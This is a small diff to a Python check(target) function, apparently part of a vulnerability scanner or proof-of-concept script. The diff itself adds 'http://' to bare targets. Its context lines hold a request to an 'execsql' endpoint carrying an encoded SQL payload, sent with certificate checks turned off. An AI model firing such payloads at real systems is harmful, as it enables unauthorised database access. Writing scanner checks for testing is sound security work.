@@ -9,7 +9,10 @@ def check(target):
     url = '/?case=crossall&act=execsql&sql=Ud-ZGLMFKBOhqavNJNK5WRCu9igJtYN1rVCO8hMFRM8NIKe6qmhRfWexXUiOqRN4aCe9aUie4Rtw5'
     headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/145.0.0.0 Safari/537.36',
                'Accept': '*/*'
-              }
+               }
+
+    if not target.startswith('http'):
+        target = f'http://{target}'
     try:
         resp = requests.get(target + url, timeout=30,
                             headers=headers, verify=False)
